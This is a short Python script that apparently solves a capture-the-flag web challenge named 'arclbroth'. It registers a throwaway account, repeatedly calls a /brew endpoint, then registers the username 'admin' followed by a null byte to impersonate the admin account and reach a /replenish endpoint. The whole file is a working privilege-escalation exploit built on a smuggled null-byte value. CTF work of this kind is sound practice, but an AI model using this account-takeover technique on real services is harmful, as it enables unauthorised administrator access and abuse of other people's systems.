import requests
import os

base = "http://0.0.0.0:3000/"
base = "https://arclbroth.chall.lac.tf/"
url = lambda end: f"{base.rstrip('/')}{end}"

username = "owo-" + os.urandom(8).hex()
password = "uwu"

s = requests.Session()
r = s.post(url("/register"), json={"username": username, "password": password})
r.raise_for_status()

r = s.get(url("/info"))
r.raise_for_status()
print(r.text)
print(r.json())

def brew():
    r = s.post(url("/brew"))
    print(r.json())

brew()
brew()
brew()
brew()
brew()
brew()

r = s.post(url("/register"), json={"username": "admin\0" + username, "password": password})
r.raise_for_status()

r = s.post(url("/replenish"))
r = s.get(url("/info"))
r.raise_for_status()
print(r.json())

brew()
